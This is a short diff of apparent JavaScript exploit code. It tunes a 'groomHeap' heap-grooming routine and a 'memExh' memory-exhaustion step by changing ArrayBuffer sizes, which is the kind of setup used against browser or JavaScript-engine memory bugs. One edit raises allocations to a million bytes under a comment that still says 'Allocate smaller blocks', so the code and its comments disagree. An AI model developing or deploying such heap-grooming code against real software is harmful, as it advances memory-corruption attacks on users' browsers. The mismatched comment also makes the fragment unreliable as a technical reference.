@@ -23,7 +23,7 @@ function groomHeap() {
 
     // Allocate and deallocate in patterns
     for (let i = 0; i < 2048; i++) { // Reduced iterations
-        let buffer = new ArrayBuffer(1000); // Allocate smaller blocks
+        let buffer = new ArrayBuffer(1000000); // Allocate smaller blocks
         tempArray.push(buffer);
     }
 
@@ -37,11 +37,11 @@ function groomHeap() {
 
 // Step 3: Memory Exhaustion Function
 function memExh() {
-    let a = new ArrayBuffer(64);
+    let a = new ArrayBuffer(32);
     let se_a = new Uint8Array(a); // View it as an array of bytes
-    let b = new ArrayBuffer(64);
+    let b = new ArrayBuffer(32);
     let se_b = new Uint8Array(b);
-    let c = new ArrayBuffer(64);
+    let c = new ArrayBuffer(32);
     let se_c = new Uint8Array(c);
 
     let bufferArray = [];
